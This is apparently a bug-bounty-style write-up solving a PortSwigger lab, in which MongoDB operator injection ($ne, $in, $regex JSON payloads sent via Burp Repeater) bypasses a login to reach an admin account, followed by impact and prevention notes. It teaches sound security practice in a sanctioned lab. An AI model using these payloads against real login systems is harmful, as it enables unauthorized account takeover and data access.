# Bypassing Login via NoSQL Operator Injection: A MongoDB Authentication Hack💉

**Author: Aditya Bhatt** <br/>
**Write-Up Type: Bug Bounty PoC** <br/>
**Target: PortSwigger Web Security Lab** <br/>
**Vulnerability: NoSQL Injection (Authentication Bypass via MongoDB Operators)** <br/>
**Difficulty: 🟠 Apprentice** <br/>
**Status: ✅ Lab Solved** <br/>

![Cover](https://github.com/user-attachments/assets/18ec2e44-cab0-4651-8c4d-8f55d720074d) <br/>

---

## 📌 TL;DR

In this lab, I exploit a classic NoSQL injection vulnerability in a MongoDB-powered login system by injecting operators like `$ne` (Not Equal) and `$regex`. These operators allow me to bypass both the username and password fields — eventually gaining unauthorized admin access. This bug, though simple in logic, is often overlooked in production applications and can lead to full account takeover — making it a **high-impact, high-reward** find in the wild.

---

## 🔍 Target: Lab Environment

**Lab URL:** [Exploiting NoSQL operator injection to bypass authentication](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication)
**Objective:** Log in as the `administrator` user using NoSQL injection.

---

## 🧠 Mindset: Think in MongoDB

This lab is based on MongoDB, where user inputs are interpreted as part of a JSON object. Insecure parsing allows attackers to inject MongoDB operators directly, causing unintended behavior.

In MongoDB, queries look like this:

```json
{
  "username": "wiener",
  "password": "peter"
}
```

However, since JSON allows embedding objects, I can inject:

```json
"username": { "$ne": "" }
```

This tells MongoDB: “Give me any user whose username is *not equal* to an empty string.” Combine that with a similarly crafted password condition and we can bypass authentication logic.

---

## 🧪 Step-by-Step PoC

### 1️⃣ Access the Lab & Login

I visit the lab and turn on **FoxyProxy** to route traffic through **BurpSuite**. Then I log in with the test credentials:

```
username: wiener
password: peter
```

![1](https://github.com/user-attachments/assets/f9bdf932-6313-4e1a-b09f-64cdf1b0c0b8) <br/>

I go to **Proxy > HTTP History**, locate the `POST /login` request, and send it to **Repeater**.

![3](https://github.com/user-attachments/assets/4ef26b00-62a1-415e-94d7-6beff0b17a3b) <br/>

---

### 2️⃣ Understanding the Default Request

Initial login request:

```json
{
    "username":"wiener",
    "password":"peter"
}
```

![4](https://github.com/user-attachments/assets/0e70b22f-0ff9-4b2c-9845-bcaa876176f9) <br/>

The response is a **302 Redirect**, indicating successful login. Good — I’ve got a baseline.

---

### 3️⃣ Testing Injection: Password `$eq`

I modify the password field to test for operator injection support:

```json
{
    "username":"wiener",
    "password":{ "$eq":"peter" }
}
```

![5](https://github.com/user-attachments/assets/5ec70c7d-5b19-4ef3-a1fb-ec1fecf6e233) <br/>

Boom — still a **302**. Operator injection is working.

---

### 4️⃣ Password `$ne` Bypass

Now I test with a negation:

```json
{
    "username":"wiener",
    "password":{ "$ne":"" }
}
```

![6](https://github.com/user-attachments/assets/aab074a8-5ff6-4e3a-a0f8-fd2e0f2c89b4) <br/>

I’m still logged in — even without the actual password. This confirms that the server evaluates the logic rather than the string values.

---

### 5️⃣ Admin Hunt Begins

I try a direct hit:

```json
{
    "username":"administrator",
    "password":{ "$ne":"" }
}
```

![7](https://github.com/user-attachments/assets/ffd3c2bd-8945-4af7-a032-04ac29ffbfca) <br/>

Sadly, I get a **200 OK** — no redirect — which means no login.

I broaden the search:

```json
{
    "username":{ "$in": ["admin", "ADMIN", "administrator", "ADMINISTRATOR"] },
    "password":{ "$ne":"" }
}
```

![8](https://github.com/user-attachments/assets/27e9b2ff-c8d1-4004-95f8-84dc701d0582) <br/>

Still **200 OK**. No dice.

---

### 6️⃣ Regex to the Rescue

Finally, I bring in the big gun — `$regex`. I craft a regex to match any username starting with `"admin"`:

```json
{
    "username":{ "$regex":"^admin" },
    "password":{ "$ne":"" }
}
```

![9](https://github.com/user-attachments/assets/98796340-5e8e-4cbd-a494-8e76a83708d3) <br/>

Bingo! I get a **302 Redirect** — I’m in!

Looking at the response confirms I’ve successfully bypassed authentication and logged in as an admin-level user.

---

### 7️⃣ Finishing Touch

I right-click the response, choose **“Show in Browser > In Current Session”**, and open the copied URL.

![10](https://github.com/user-attachments/assets/7e9721a0-f47d-44ca-b8ac-ea4f5579603d) <br/>

**🎉 Lab solved. Admin access achieved.**

![11](https://github.com/user-attachments/assets/50597c0b-e86d-404d-9837-f1bb30bd7433) <br/>

---

## 🔒 Impact in Real-World Scenarios

This kind of NoSQL injection is **extremely dangerous** when:

* The backend does **not sanitize JSON input**.
* The application **relies entirely** on NoSQL-based authentication logic.
* Logging in as admin **leads to privilege escalation** or **data exfiltration**.

A real-life version of this vulnerability could result in:

* Account takeovers
* Access to internal dashboards
* Full database compromise

Platforms like **HackerOne** and **Bugcrowd** have multiple high-\$\$ reports for similar flaws. Don't underestimate these seemingly simple bugs.

---

## 🧰 Prevention Tips for Developers

* **Type-check and sanitize** all incoming JSON inputs.
* Never blindly parse user-supplied data as query objects.
* Use **whitelisting or input validation libraries** (e.g., Joi or express-validator).
* Implement **authentication logic on server-side**, not directly via NoSQL query logic.

---

## 🏁 Final Thoughts

This lab demonstrates how simple logic flaws in NoSQL can grant devastating access to attackers. With just a few tweaks in BurpSuite Repeater and a little regex magic, I’ve bypassed an authentication system and escalated my privileges to admin.

Stay curious, stay sharp — and remember, **never trust user input**.

---

> ⚠️ **Disclaimer:**
> This article is intended **for educational purposes only**. The techniques and methods described herein are meant to raise awareness about web application security and help developers and security professionals better understand and defend against such vulnerabilities. **Do not attempt to exploit any system without proper authorization. Unauthorized access is illegal and unethical.**

---

## 🔗 Connect With Me

I regularly post about **ethical hacking**, **bug bounties**, and **real-world exploitation** techniques.

🛡 [GitHub](https://github.com/AdityaBhatt3010) <br/>
✍️ [Medium @adityabhatt3010](https://medium.com/@adityabhatt3010) <br/>
🔗 [LinkedIn](https://www.linkedin.com/in/adityabhatt3010/) <br/>

---

